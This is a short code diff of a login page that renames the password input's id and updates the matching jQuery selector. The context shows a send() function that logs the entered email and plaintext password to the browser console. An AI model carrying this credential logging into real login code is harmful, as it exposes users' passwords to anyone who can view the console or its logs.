@@ -9,7 +9,7 @@
 </head>
 <body>
     <input type="text" placeholder="email" id="email">
-    <input type="password" placeholder="password" id="pass">
+    <input type="password" placeholder="password" id="password">
     <button onclick="send()">Log in</button>
 </body>
 </html>
@@ -18,7 +18,7 @@
     deleteAllCookies()
     function send(){
         email=$("#email").val();
-        pass=$("#pass").val();
+        pass=$("#password").val();
         console.log(email);
         console.log(pass);
         data = {
